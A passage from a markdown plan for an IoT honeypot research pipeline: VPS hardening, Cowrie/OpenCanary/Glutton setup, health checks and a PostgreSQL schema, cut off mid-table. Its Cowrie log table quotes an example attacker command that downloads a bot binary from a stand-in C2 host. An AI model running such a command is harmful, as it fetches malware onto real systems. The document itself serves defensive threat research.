# IoT Cybersecurity Research — Data Pipeline Plan
> **VPS Spec**: 1 vCPU · 1 GB RAM · 35 GB NVMe SSD · Ubuntu 24.04 · Germany (Hetzner/Contabo)
> **Research Phase**: Phase 1 (Weeks 1–2) — Core Signals

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [VPS RAM Budget](#2-vps-ram-budget)
3. [Honeypot Stack](#3-honeypot-stack)
   - 3.1 [Cowrie — SSH/Telnet (Primary)](#31-cowrie--sshtelnet-primary)
   - 3.2 [OpenCanary — Multi-Protocol Alerting](#32-opencanary--multi-protocol-alerting)
   - 3.3 [Glutton — Catch-All TCP](#33-glutton--catch-all-tcp)
   - 3.4 [What NOT to Use](#34-what-not-to-use)
4. [VPS Hardening (Do This First)](#4-vps-hardening-do-this-first)
   - 4.1 [Move Real SSH Off Port 22](#41-move-real-ssh-off-port-22)
   - 4.2 [UFW Firewall Rules](#42-ufw-firewall-rules)
   - 4.3 [Create Swapfile](#43-create-swapfile)
   - 4.4 [Fail2Ban on Real SSH Port](#44-fail2ban-on-real-ssh-port)
   - 4.5 [Automatic Security Updates](#45-automatic-security-updates)
5. [Honeypot Installation and Configuration](#5-honeypot-installation-and-configuration)
   - 5.1 [Cowrie Setup](#51-cowrie-setup)
   - 5.2 [OpenCanary Setup](#52-opencanary-setup)
   - 5.3 [Glutton Setup](#53-glutton-setup)
   - 5.4 [systemd Service Hardening](#54-systemd-service-hardening)
6. [Verifying Honeypots Are Live](#6-verifying-honeypots-are-live)
   - 6.1 [Manual Checks](#61-manual-checks)
   - 6.2 [Health-Check Script](#62-health-check-script)
   - 6.3 [Process Watchdog](#63-process-watchdog)
   - 6.4 [External Monitoring (Zero RAM Cost)](#64-external-monitoring-zero-ram-cost)
7. [PostgreSQL Setup and Schema](#7-postgresql-setup-and-schema)
   - 7.1 [Installation and Tuning](#71-installation-and-tuning)
   - 7.2 [Full Database Schema](#72-full-database-schema)
   - 7.3 [Disk Allocation](#73-disk-allocation)
   - 7.4 [Partition Pruning and Retention](#74-partition-pruning-and-retention)
8. [Pipeline DAG Architecture](#8-pipeline-dag-architecture)
   - 8.1 [Why Custom Python + Cron (Not Airflow/Prefect)](#81-why-custom-python--cron-not-airflowprefect)
   - 8.2 [Full DAG Structure](#82-full-dag-structure)
   - 8.3 [Cron Schedule](#83-cron-schedule)
   - 8.4 [Deployment Split — VPS vs Local](#84-deployment-split--vps-vs-local)
   - 8.5 [Log Synchronization](#85-log-synchronization)
   - 8.6 [Common Schema and Provenance](#86-common-schema-and-provenance)
9. [Pipeline Implementation](#9-pipeline-implementation)
   - 9.1 [Task Decorator Pattern](#91-task-decorator-pattern)
   - 9.2 [Log Bookmark (Incremental Reads)](#92-log-bookmark-incremental-reads)
   - 9.3 [Cowrie Log Ingestion](#93-cowrie-log-ingestion)
   - 9.4 [IOC Extraction](#94-ioc-extraction)
   - 9.5 [Shodan Integration](#95-shodan-integration)
   - 9.6 [Censys Integration](#96-censys-integration)
   - 9.7 [Graph Builder](#97-graph-builder)
10. [Log Rotation and Disk Management](#10-log-rotation-and-disk-management)
11. [Churn Analysis Queries](#11-churn-analysis-queries)
12. [Phase 2 Additions](#12-phase-2-additions)
13. [Key Constraints and Notes](#13-key-constraints-and-notes)

---

## 1. Architecture Overview

> **Deployment split**: The VPS is a pure **sensor node** — honeypots write log files and nothing else. Shodan/Censys polling, PostgreSQL, graph building, and all analysis run on the **local machine**. This frees ~175 MB of RAM on the VPS and removes all resource constraints from processing tasks. See [Section 8.4](#84-deployment-split--vps-vs-local) for the full component mapping.

```
┌─────────────────────────────────────────────────────────────────┐
│  VPS — Sensor Node  (1 GB RAM · Ubuntu 24.04 · Germany)         │
│                                                                 │
│  ┌──────────┐   ┌────────────┐   ┌──────────────┐               │
│  │  Cowrie  │   │ OpenCanary │   │    Glutton   │  ◄─ attackers │
│  │ SSH/Tel  │   │ Multi-prot │   │  Catch-all   │               │
│  └────┬─────┘   └──────┬─────┘   └──────┬───────┘               │
│       └────────────────┴────────────────┘                       │
│                         │ writes JSON log files to disk         │
│         /home/cowrie/var/log/cowrie/cowrie.json                 │
│         /var/tmp/opencanary.log                                 │
│                                                                 │
│  Nothing else runs here. No PostgreSQL. No pipeline process.    │
└──────────────────────────┬──────────────────────────────────────┘
                           │
              rsync pull over SSH (port 2222)
              every 30 minutes, triggered from local
                           │
┌──────────────────────────▼────────────────────────────────────────┐
│  LOCAL MACHINE — Analyst Node  (no RAM constraints)               │
│                                                                   │
│  Raw log mirror          Full Pipeline (cron-scheduled DAG)       │
│  /data/raw-logs/         ┌─────────────────────────────────────┐  │
│  ├── cowrie/             │ every 30 min (at :05 and :35):      │  │
│  ├── opencanary/         │  sync_logs  (rsync pull from VPS)   │  │
│  └── glutton/            │  ingest_cowrie + ingest_opencanary  │  │
│                          │  store_raw_events                   │  │
│  API credentials (.env)  │  extract_credentials / urls / c2    │  │
│  SHODAN_API_KEY          │                                     │  │
│  CENSYS_API_ID/SECRET    │ daily 01:00 UTC:                    │  │
│                          │  aggregate_churn                    │  │
│                          │                                     │  │
│                          │ weekly Sun 02:00 UTC:               │  │
│                          │  poll_shodan + poll_censys          │  │
│                          │  [malware_feeds   — Phase 2]        │  │
│                          │  [passive_dns     — Phase 2]        │  │
│                          │                                     │  │
│                          │ weekly Sun 04:00 UTC:               │  │
│                          │  build_networkx_graph               │  │
│                          │  cluster_campaigns                  │  │
│                          └───────────────────┬─────────────────┘  │
│                                              │                    │
│                          ┌───────────────────▼─────────────────┐  │
│                          │      PostgreSQL 16 (master DB)      │  │
│                          │  honeypot_events  (partitioned)     │  │
│                          │  ioc_records                        │  │
│                          │  device_records  (Shodan/Censys)    │  │
│                          │  graph_nodes + graph_edges          │  │
│                          │  campaign_clusters                  │  │
│                          │  ip_activity_daily  (churn)         │  │
│                          │  pipeline_runs  ← provenance log    │  │
│                          └─────────────────────────────────────┘  │
│                                                                   │
│  Analysis: Jupyter notebooks · NetworkX · matplotlib · pandas     │
└───────────────────────────────────────────────────────────────────┘
```

**Design principles:**
- **VPS is a dumb sensor** — writes log files only. No PostgreSQL, no pipeline process, no API calls. Keeps RAM below 400 MB.
- **Local machine is the brain** — all API calls, processing, storage, and analysis. No RAM constraints.
- **rsync pull** — local machine actively pulls raw logs from VPS every 30 min. VPS does not need to know about local. Zero extra software on VPS.
- **Raw logs are preserved forever on local disk** — files exist before processing. This is the **reproducibility** guarantee.
- **Every pipeline run is recorded** in the `pipeline_runs` table with git hash, input files, and byte offsets. This is the **traceability** guarantee.
- **Idempotent UPSERTs** throughout — re-running any task on the same data is safe. This is the **modularity** guarantee.

---

## 2. VPS RAM Budget

By removing PostgreSQL and the pipeline process from the VPS, RAM usage drops from ~655 MB to ~360 MB — leaving substantial headroom for attack traffic spikes.

### VPS (Sensor Node Only)

| Component | RAM | Notes |
|---|---|---|
| Ubuntu 24.04 OS baseline | ~220 MB | systemd, kernel, sshd on port 2222 |
| Cowrie | ~100 MB | Python/Twisted; peaks ~250 MB under heavy brute-force |
| OpenCanary | ~25 MB | Python daemon |
| Glutton | ~15 MB | Go binary |
| **Total at idle** | **~360 MB** | **35% of 1,024 MB** |
| **Peak (heavy attack storm)** | **~480 MB** | **47% of 1,024 MB** |
| Swapfile | 1 GB | On-disk OOM protection |

> **vs original design** (PostgreSQL + pipeline on VPS): saved ~175–195 MB by moving storage and processing to local.

> **Cowrie systemd cap**: `MemoryMax=250M` prevents a brute-force storm from OOM-killing the other honeypot processes.

### Local Machine (Analyst Node)

No strict RAM budget — use whatever the research machine provides:

| Component | RAM | Notes |
|---|---|---|
| PostgreSQL 16 | 200–500 MB | Grows with data volume; tune `shared_buffers` to taste |
| Pipeline (during run) | ~100–200 MB | Transient — only active during cron runs |
| NetworkX graph (weekly) | 100 MB – 1 GB+ | Depends on graph size; will grow over the 6-month window |
| Shodan/Censys API client | ~50 MB | Minimal — HTTP client + JSON parsing |
| Jupyter notebooks | 200–500 MB | Only when actively running analysis |

---

## 3. Honeypot Stack

### 3.1 Cowrie — SSH/Telnet (Primary)

**Role**: Deep-interaction honeypot. Emulates a BusyBox Linux shell. Attackers log in, run commands, and download malware — Cowrie captures all of it.

**What it logs** (JSON at `var/log/cowrie/cowrie.json`):

| Event ID | What is captured |
|---|---|
| `cowrie.login.failed` / `.success` | `username`, `password`, source IP/port |
| `cowrie.command.input` | Full command string (e.g. `wget http://malc2.xyz/bot.arm`) |
| `cowrie.session.file_download` | Download URL + SHA256 hash of file |
| `cowrie.session.file_upload` | SFTP uploads |
| `cowrie.direct-tcpip.*` | SSH tunnel attempts — reveals C2 endpoints |
| `cowrie.session.connect` | Source IP, SSH client fingerprint (hassh) |

**Why it matters for this research**: Captures Mirai-style credential dictionaries, post-login commands, and malware download URLs — the most critical IOCs for botnet campaign clustering.

**Key config** (`/etc/cowrie/cowrie.cfg`):
```ini
[honeypot]
hostname = nas-disk-station        # Impersonate a NAS/router
ssh_port = 22
telnet_port = 23
download_limit_size = 10485760    # 10 MB per file cap

[output_jsonlog]
enabled = true
logfile = ${honeypot:log_path}/cowrie.json

[output_mysql]
enabled = false    # Use pipeline → PostgreSQL instead
```

---

### 3.2 OpenCanary — Multi-Protocol Alerting

**Role**: Low-interaction, multi-protocol honeypot. Triggers an alert the moment any attacker touches any enabled port. Extremely low RAM (~25 MB).

**Enabled modules for IoT research**:

| Protocol | Port | IoT Relevance |
|---|---|---|
| SSH | 22* | Credential attempts (low-interaction only) |
| Telnet | 23 | IoT device default access |
| HTTP | 80, 8080 | Admin panel scans, CVE probing |
| FTP | 21 | Credential attempts |
| SMTP | 25 | Spam relay detection |
| SNMP | 161 | Router/switch reconnaissance |
| MySQL | 3306 | Database exposure alerts |
| RDP | 3389 | General attacker tooling |
| Portscan | via iptables | Detects scanners before they hit other ports |

> *OpenCanary SSH on port 22 conflicts with Cowrie. **Let Cowrie own port 22** and disable OpenCanary SSH, or run OpenCanary SSH on port 2223 as a secondary signal.

**Log output** (`/var/tmp/opencanary.log`):
```json
{
  "dst_host": "10.0.0.1",
  "dst_port": 21,
  "local_time": "2026-04-10 03:41:22",
  "logdata": {"PASSWORD": "admin123", "USERNAME": "root"},
  "logtype": 2000,
  "node_id": "iot-honeypot-de-01",
  "src_host": "185.220.101.45",
  "src_port": 51234
}
```

---

### 3.3 Glutton — Catch-All TCP

**Role**: Go binary that uses `iptables TPROXY` to intercept **all incoming TCP traffic** on any port not already bound by Cowrie or OpenCanary. Acts as a zero-configuration catch-all.

**Why this matters for IoT research**:

| Port | Protocol | IoT Attack Context |
|---|---|---|
| **7547** | TR-069 / CWMP | ISP-managed router management — Mirai heavily exploited this |
| **5555** | ADB | Android Debug Bridge — Mozi botnet exploit |
| **1883** | MQTT | IoT message bus — unauthenticated brokers targeted |
| **48101** | Mirai C2 variant | Secondary C2 port used by some Mirai forks |
| **Any unknown** | Raw TCP payload | Captures novel probing patterns automatically |

**How it works**: Glutton registers iptables `TPROXY` rules. All TCP packets destined for unclaimed ports are redirected to Glutton's listener, which logs raw payloads and dispatches to protocol-specific decoders (SSH, Telnet, HTTP, Memcache, MySQL, Redis, SIP, SMBv1, SMTP, XMPP, VNC).

---

### 3.4 What NOT to Use

| Tool | Reason to Skip |
|---|---|
| **T-Pot** | Requires **8 GB RAM minimum** (Elastic Stack alone). Absolutely not viable. |
| **Dionaea** | 100–200 MB RAM; last release 2020, unmaintained. Skip unless MQTT malware capture is a hard requirement. |
| **HoneyTrap** | Abandoned — last commit 5+ years ago. |
| **Airflow** | Scheduler + webserver = 800 MB+ minimum. Kills the honeypots. |

---

## 4. VPS Hardening (Do This First)

> **Do this before installing any honeypot.** Once Cowrie is running on port 22, your real SSH must already be on a different port.

### 4.1 Move Real SSH Off Port 22

```bash
# Step 1: Edit /etc/ssh/sshd_config
sudo nano /etc/ssh/sshd_config
```

Set these values:
```
Port 2222
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
X11Forwarding no
AllowTcpForwarding no
```

```bash
# Step 2: Allow port 2222 in UFW BEFORE restarting SSH
sudo ufw allow 2222/tcp comment "real SSH"

# Step 3: Restart SSH daemon
sudo systemctl restart sshd

# Step 4: Open a SECOND terminal and verify you can connect on port 2222
ssh -p 2222 user@YOUR_VPS_IP

# Step 5: Only after confirming the second terminal works, close the original session
```

> **Warning**: Do not skip Step 4. If you restart SSH and cannot reconnect, you are locked out of your VPS.

---

### 4.2 UFW Firewall Rules

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Real SSH (moved)
sudo ufw allow 2222/tcp comment "real SSH"

# Honeypot attack surface — intentionally exposed
sudo ufw allow 22/tcp    comment "Cowrie SSH"
sudo ufw allow 23/tcp    comment "Cowrie Telnet"
sudo ufw allow 80/tcp    comment "OpenCanary HTTP"
sudo ufw allow 8080/tcp  comment "IoT admin panel canary"
sudo ufw allow 443/tcp   comment "HTTPS canary (optional)"
sudo ufw allow 21/tcp    comment "OpenCanary FTP"
sudo ufw allow 25/tcp    comment "OpenCanary SMTP"
sudo ufw allow 7547/tcp  comment "TR-069/CWMP (router CPE)"
sudo ufw allow 5555/tcp  comment "ADB (Android/IoT)"
sudo ufw allow 1883/tcp  comment "MQTT"

sudo ufw enable
sudo ufw status verbose
```

---

### 4.3 Create Swapfile

```bash
sudo fallocate -l 1G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab

# Use swap only under memory pressure (not as first resort)
sudo sysctl vm.swappiness=10
echo 'vm.swappiness=10' | sudo tee -a /etc/sysctl.conf
```

---

### 4.4 Fail2Ban on Real SSH Port

```bash
sudo apt install fail2ban -y
```

Create `/etc/fail2ban/jail.local`:
```ini
[sshd]
enabled  = true
port     = 2222
filter   = sshd
logpath  = /var/log/auth.log
maxretry = 3
bantime  = 3600
findtime = 600
```

```bash
sudo systemctl enable --now fail2ban
```

---

### 4.5 Automatic Security Updates

```bash
sudo apt install unattended-upgrades -y
```

Edit `/etc/apt/apt.conf.d/50unattended-upgrades`:
```
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}-security";
};
Unattended-Upgrade::Automatic-Reboot "false";   // Never auto-reboot (stops honeypots)
Unattended-Upgrade::Mail "your@email.com";
```

---

## 5. Honeypot Installation and Configuration

### 5.1 Cowrie Setup

```bash
# Create dedicated user
sudo adduser --disabled-password --gecos "" cowrie

# Install dependencies
sudo apt install -y git python3-virtualenv libssl-dev libffi-dev build-essential \
    python3-dev authbind

# Clone and install
sudo -u cowrie bash -c "
    cd /home/cowrie
    git clone https://github.com/cowrie/cowrie
    cd cowrie
    python3 -m virtualenv cowrie-env
    source cowrie-env/bin/activate
    pip install --upgrade pip
    pip install -r requirements.txt
"

# Allow Cowrie (non-root) to bind to port 22
sudo touch /etc/authbind/byport/22
sudo touch /etc/authbind/byport/23
sudo chown cowrie /etc/authbind/byport/22
sudo chown cowrie /etc/authbind/byport/23

# Copy and edit config
sudo -u cowrie cp /home/cowrie/cowrie/etc/cowrie.cfg.dist /home/cowrie/cowrie/etc/cowrie.cfg
```

Edit `/home/cowrie/cowrie/etc/cowrie.cfg`:
```ini
[honeypot]
hostname = nas-disk-station
ssh_port = 22
telnet_port = 23
download_limit_size = 10485760
fake_addr = 10.0.0.1

[output_jsonlog]
enabled = true
logfile = ${honeypot:log_path}/cowrie.json
```

```bash
# Start
sudo -u cowrie /home/cowrie/cowrie/bin/cowrie start

# Enable systemd service
sudo cp /home/cowrie/cowrie/doc/systemd/cowrie.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable cowrie
```

---

### 5.2 OpenCanary Setup

```bash
sudo apt install -y python3-pip python3-dev
sudo pip3 install opencanary

# Generate default config
opencanaryd --copyconfig
# Config saved to /etc/opencanaryd/opencanary.conf
```

Edit `/etc/opencanaryd/opencanary.conf` — enable these modules:
```json
{
    "device.node_id": "iot-honeypot-de-01",
    "logger": {
        "class": "PyLogger",
        "kwargs": {
            "formatters": {
                "plain": {"format": "%(message)s"}
            },
            "handlers": {
                "file": {
                    "class": "logging.FileHandler",
                    "filename": "/var/tmp/opencanary.log"
                }
            }
        }
    },
    "ftp.enabled": true,
    "ftp.port": 21,
    "http.enabled": true,
    "http.port": 8080,
    "http.skin": "basicLogin",
    "mysql.enabled": true,
    "mysql.port": 3306,
    "smtp.enabled": true,
    "smtp.port": 25,
    "snmp.enabled": true,
    "telnet.enabled": true,
    "telnet.port": 2323,
    "ssh.enabled": false
}
```

```bash
# Create systemd service
sudo tee /etc/systemd/system/opencanary.service > /dev/null <<'EOF'
[Unit]
Description=OpenCanary Honeypot
After=network.target

[Service]
Type=simple
User=nobody
ExecStart=/usr/local/bin/opencanaryd --start
Restart=always
RestartSec=10
MemoryMax=50M

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now opencanary
```

---

### 5.3 Glutton Setup

```bash
# Install Go (if not already present)
sudo apt install -y golang-go

# Install Glutton
go install github.com/mushorg/glutton@latest

# Configure iptables TPROXY (redirects all unclaimed TCP to Glutton)
sudo iptables -t mangle -A PREROUTING -p tcp \
    ! --dport 22 ! --dport 23 ! --dport 80 ! --dport 8080 \
    ! --dport 2222 ! --dport 5432 \
    -j TPROXY --tproxy-mark 0x1/0x1 --on-port 5000

# Save iptables rules
sudo apt install -y iptables-persistent
sudo netfilter-persistent save
```

---

### 5.4 systemd Service Hardening

Add these security directives to each honeypot's `.service` file under `[Service]`:

```ini
[Service]
# ... existing directives ...
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=read-only
PrivateTmp=yes
PrivateDevices=yes
MemoryMax=250M        # Cowrie: 250M | OpenCanary: 50M | Glutton: 50M
CPUQuota=25%
Restart=always
RestartSec=10
```

Limit what Cowrie can do outbound (allow downloads for malware capture, block everything else):
```bash
sudo iptables -A OUTPUT -m owner --uid-owner cowrie -p tcp --dport 80  -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner cowrie -p tcp --dport 443 -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner cowrie                    -j DROP
```

---

## 6. Verifying Honeypots Are Live

### 6.1 Manual Checks

```bash
# Verify ports are bound
ss -tlnp | grep -E ':22|:23|:80|:8080|:21'

# Check service status
systemctl status cowrie
systemctl status opencanary

# Watch Cowrie events in real time
tail -f /home/cowrie/cowrie/var/log/cowrie/cowrie.json | python3 -m json.tool

# Count events in the last hour
awk -v d="$(date -u -d '1 hour ago' '+%Y-%m-%dT%H')" '$0 > d' \
    /home/cowrie/cowrie/var/log/cowrie/cowrie.json | wc -l
```

> **Expected**: On a Germany datacenter IP, SSH brute-force events should appear in `cowrie.json` within **10–15 minutes** of the honeypot going live.

---

### 6.2 Health-Check Script

Create `/usr/local/bin/honeypot_healthcheck.py`:

```python
#!/usr/bin/env python3
"""
Checks honeypot log freshness and event volume.
Run via cron every 5 minutes.
"""
import json
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

COWRIE_LOG    = Path("/home/cowrie/cowrie/var/log/cowrie/cowrie.json")
OPENCANARY_LOG = Path("/var/tmp/opencanary.log")
HEALTH_LOG    = Path("/var/log/honeypot_health.log")

def check_freshness(path: Path, max_age_minutes: int = 30) -> str:
    if not path.exists():
        return f"MISSING: {path}"
    age = time.time() - path.stat().st_mtime
    if age > max_age_minutes * 60:
        return f"STALE ({age/60:.0f}m): {path.name}"
    return f"OK: {path.name} (last write {age:.0f}s ago)"

def count_recent_events(path: Path, minutes: int = 60) -> int:
    cutoff = (datetime.now(timezone.utc) - timedelta(minutes=minutes)).isoformat()
    count = 0
    try:
        with open(path) as f:
            for line in f:
                try:
                    if json.loads(line).get("timestamp", "") > cutoff:
                        count += 1
                except Exception:
                    pass
    except Exception:
        pass
    return count

timestamp     = datetime.now().isoformat()
cowrie_status = check_freshness(COWRIE_LOG)
canary_status = check_freshness(OPENCANARY_LOG)
recent_events = count_recent_events(COWRIE_LOG)

with open(HEALTH_LOG, "a") as f:
    f.write(
        f"[{timestamp}] Cowrie={cowrie_status} | "
        f"Canary={canary_status} | Events/1h={recent_events}\n"
    )
```

```bash
sudo chmod +x /usr/local/bin/honeypot_healthcheck.py
# Add to crontab:
# */5 * * * * python3 /usr/local/bin/honeypot_healthcheck.py
```

---

### 6.3 Process Watchdog

Install `monit` (~5 MB RAM):
```bash
sudo apt install -y monit
```

Create `/etc/monit/conf.d/honeypots`:
```
check process cowrie
    with pidfile /home/cowrie/cowrie/var/run/cowrie.pid
    start program = "/bin/systemctl start cowrie"
    stop program  = "/bin/systemctl stop cowrie"
    if not exist then restart
    if 3 restarts within 5 cycles then alert

check process opencanary
    matching "opencanaryd"
    start program = "/bin/systemctl start opencanary"
    stop program  = "/bin/systemctl stop opencanary"
    if not exist then restart
```

```bash
sudo systemctl enable --now monit
```

---

### 6.4 External Monitoring (Zero RAM Cost)

1. Sign up at [UptimeRobot](https://uptimerobot.com/) (free tier)
2. Add a **TCP monitor** for `YOUR_VPS_IP:22` with a 5-minute check interval
3. Add alert via email or Telegram
4. If port 22 goes down → Cowrie is dead → monit/systemd should have restarted it

---

## 7. PostgreSQL Setup and Schema

> **Runs on LOCAL machine**, not the VPS. Run all commands in this section on your analyst/development machine. No PostgreSQL is installed on the VPS.

### 7.1 Installation and Tuning

```bash
sudo apt install -y postgresql-16
sudo systemctl enable --now postgresql
```

Edit `/etc/postgresql/16/main/postgresql.conf`:
```ini
# Memory — leave headroom for OS + honeypots
shared_buffers          = 128MB
effective_cache_size    = 384MB
work_mem                = 4MB
maintenance_work_mem    = 32MB
wal_buffers             = 4MB

# Checkpoint tuning (reduce I/O on NVMe)
checkpoint_completion_target = 0.9
max_wal_size            = 512MB
min_wal_size            = 64MB

# Connection limits
max_connections         = 20

# Logging
log_min_duration_statement = 1000   # Log queries taking > 1 second
```

```bash
sudo systemctl restart postgresql

# Create research database and user
sudo -u postgres psql <<'SQL'
CREATE USER pipeline WITH PASSWORD 'change_this_password';
CREATE DATABASE iot_research OWNER pipeline;
GRANT ALL PRIVILEGES ON DATABASE iot_research TO pipeline;
SQL
```

---

### 7.2 Full Database Schema

```sql
-- Connect as pipeline user to iot_research database

-- ============================================================
-- HONEYPOT EVENTS (partitioned by month for time-series queries)
-- ============================================================
CREATE TABLE honeypot_events (
    id          BIGSERIAL,
    event_time  TIMESTAMPTZ NOT NULL,
    ingested_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    source_ip   INET NOT NULL,
    source_port INT,
    dest_port   INT,
    honeypot    VARCHAR(20) NOT NULL,  -- 'cowrie' | 'opencanary' | 'glutton'
    protocol    VARCHAR(20),           -- 'ssh' | 'telnet' | 'http' | 'ftp' | 'mqtt'
    event_type  VARCHAR(100) NOT NULL, -- 'login.attempt' | 'login.success'
                                       -- | 'command.input' | 'file.download' | 'port_scan'
    session_id  VARCHAR(100),
    username    TEXT,
    password    TEXT,
    command_str TEXT,
    download_url TEXT,
    file_hash   VARCHAR(64),           -- SHA256 of downloaded file
    hassh       VARCHAR(64),           -- SSH client fingerprint
    user_agent  TEXT,
    http_path   TEXT,
    pipeline_run_id UUID,              -- FK to pipeline_runs(run_id); set during ingestion
    raw_data    JSONB NOT NULL DEFAULT '{}'
) PARTITION BY RANGE (event_time);

-- Create monthly partitions (repeat for each month of collection window)
CREATE TABLE honeypot_events_2026_04 PARTITION OF honeypot_events
    FOR VALUES FROM ('2026-04-01') TO ('2026-05-01');
CREATE TABLE honeypot_events_2026_05 PARTITION OF honeypot_events
    FOR VALUES FROM ('2026-05-01') TO ('2026-06-01');
CREATE TABLE honeypot_events_2026_06 PARTITION OF honeypot_events
    FOR VALUES FROM ('2026-06-01') TO ('2026-07-01');
CREATE TABLE honeypot_events_2026_07 PARTITION OF honeypot_events
    FOR VALUES FROM ('2026-07-01') TO ('2026-08-01');
CREATE TABLE honeypot_events_2026_08 PARTITION OF honeypot_events
    FOR VALUES FROM ('2026-08-01') TO ('2026-09-01');
CREATE TABLE honeypot_events_2026_09 PARTITION OF honeypot_events
    FOR VALUES FROM ('2026-09-01') TO ('2026-10-01');

CREATE INDEX ON honeypot_events (event_time DESC);
CREATE INDEX ON honeypot_events (source_ip);
CREATE INDEX ON honeypot_events (honeypot, event_type);
CREATE INDEX ON honeypot_events (session_id) WHERE session_id IS NOT NULL;

-- ============================================================
-- SOURCE IP METADATA (per-IP enrichment: ASN, country, tags)
-- ============================================================
CREATE TABLE source_ips (
    ip              INET PRIMARY KEY,
    first_seen      TIMESTAMPTZ,
    last_seen       TIMESTAMPTZ,
    event_count     INT DEFAULT 0,
    country_code    CHAR(2),
    asn             BIGINT,
    org             TEXT,
    reverse_dns     TEXT,
    is_tor          BOOLEAN DEFAULT FALSE,
    is_vpn          BOOLEAN DEFAULT FALSE,
    abuse_score     FLOAT,
    tags            TEXT[],              -- 'scanner' | 'botnet' | 'targeted'
    updated_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX ON source_ips (asn);
CREATE INDEX ON source_ips (country_code);

-- ============================================================
-- NORMALIZED IOCs
-- ============================================================
CREATE TABLE ioc_records (
    id               BIGSERIAL PRIMARY KEY,
    ioc_type         VARCHAR(30) NOT NULL, -- 'ip'|'domain'|'url'|'sha256'
                                           -- |'credential'|'command'|'hassh'
    ioc_value        TEXT NOT NULL,
    first_seen       TIMESTAMPTZ NOT NULL,
    last_seen        TIMESTAMPTZ NOT NULL,
    occurrence_count INT DEFAULT 1,
    source_honeypots TEXT[],
    confidence       FLOAT DEFAULT 1.0,
    tags             TEXT[],
    metadata         JSONB DEFAULT '{}',
    created_at       TIMESTAMPTZ DEFAULT NOW(),
    UNIQUE (ioc_type, ioc_value)
);

CREATE INDEX ON ioc_records (ioc_type);
CREATE INDEX ON ioc_records (first_seen DESC);
CREATE INDEX ON ioc_records USING GIN (tags);

-- ============================================================
-- CREDENTIALS DICTIONARY
-- ============================================================
CREATE TABLE credentials (
    id              BIGSERIAL PRIMARY KEY,
    username        TEXT NOT NULL DEFAULT '',
    password        TEXT NOT NULL DEFAULT '',
    first_seen      TIMESTAMPTZ NOT NULL,
    last_seen       TIMESTAMPTZ NOT NULL,
    attempt_count   INT DEFAULT 1,
    success_count   INT DEFAULT 0,
    source_ip_count INT DEFAULT 0,
    UNIQUE (username, password)
);

CREATE INDEX ON credentials (attempt_count DESC);
CREATE INDEX ON credentials (username);

-- ============================================================
-- SHODAN / CENSYS DEVICE RECORDS (weekly snapshots)
-- ============================================================
CREATE TABLE device_records (
    id              BIGSERIAL PRIMARY KEY,
    source          VARCHAR(10) NOT NULL,  -- 'shodan' | 'censys'
    snapshot_date   DATE NOT NULL,
    ip              INET NOT NULL,
    port            INT,
    transport       VARCHAR(5),            -- 'tcp' | 'udp'
    protocol        VARCHAR(30),
    product         TEXT,
    version         TEXT,
    cpe             TEXT[],
    cve_ids         TEXT[],
    country_code    CHAR(2),
    asn             BIGINT,
    org             TEXT,
    isp             TEXT,
    latitude        DOUBLE PRECISION,
    longitude       DOUBLE PRECISION,
    raw_banner      TEXT,
    raw_data        JSONB NOT NULL DEFAULT '{}'
);

CREATE UNIQUE INDEX ON device_records (source, ip, port, snapshot_date);
CREATE INDEX ON device_records (snapshot_date DESC);
CREATE INDEX ON device_records (ip);
CREATE INDEX ON device_records (country_code, snapshot_date);
CREATE INDEX ON device_records USING GIN (cve_ids);

-- ============================================================
-- INFRASTRUCTURE GRAPH
-- ============================================================
CREATE TABLE graph_nodes (
    id          BIGSERIAL PRIMARY KEY,
    node_type   VARCHAR(30) NOT NULL,  -- 'ip'|'domain'|'url'|'c2'|'malware_hash'
    node_value  TEXT NOT NULL UNIQUE,
    first_seen  TIMESTAMPTZ,
    last_seen   TIMESTAMPTZ,
    degree_in   INT DEFAULT 0,
    degree_out  INT DEFAULT 0,
    cluster_id  VARCHAR(100),
    metadata    JSONB DEFAULT '{}'
);

CREATE INDEX ON graph_nodes (node_type);
CREATE INDEX ON graph_nodes (cluster_id);

CREATE TABLE graph_edges (
    id              BIGSERIAL PRIMARY KEY,
    source_node_id  BIGINT NOT NULL REFERENCES graph_nodes(id) ON DELETE CASCADE,
    target_node_id  BIGINT NOT NULL REFERENCES graph_nodes(id) ON DELETE CASCADE,
    edge_type       VARCHAR(50) NOT NULL,
    -- 'downloads_from' | 'resolves_to' | 'same_campaign'
    -- | 'c2_for' | 'reuses_credential' | 'shares_asn'
    weight          FLOAT DEFAULT 1.0,
    first_seen      TIMESTAMPTZ,
    last_seen       TIMESTAMPTZ,
    evidence        JSONB DEFAULT '{}',
    UNIQUE (source_node_id, target_node_id, edge_type)
);

CREATE INDEX ON graph_edges (source_node_id);
CREATE INDEX ON graph_edges (target_node_id);
CREATE INDEX ON graph_edges (edge_type);

-- ============================================================
-- CAMPAIGN CLUSTERS
-- ============================================================
CREATE TABLE campaign_clusters (
    id              BIGSERIAL PRIMARY KEY,
    cluster_id      VARCHAR(100) UNIQUE NOT NULL,
    name            TEXT,                -- e.g. "Mirai-ARM-2026-04"
    first_seen      TIMESTAMPTZ,
    last_seen       TIMESTAMPTZ,
    active          BOOLEAN DEFAULT TRUE,
    event_count     INT DEFAULT 0,
    source_ip_count INT DEFAULT 0,
    primary_protocol VARCHAR(20),
    primary_creds   TEXT[],
    c2_ips          INET[],
    c2_domains      TEXT[],
    malware_hashes  TEXT[],
    tactics         TEXT[],
    metadata        JSONB DEFAULT '{}'
);

-- ============================================================
-- IP ACTIVITY (pre-aggregated for churn / survival analysis)
-- ============================================================
CREATE TABLE ip_activity_daily (
    day             DATE NOT NULL,
    source_ip       INET NOT NULL,
    honeypot        VARCHAR(20) NOT NULL,
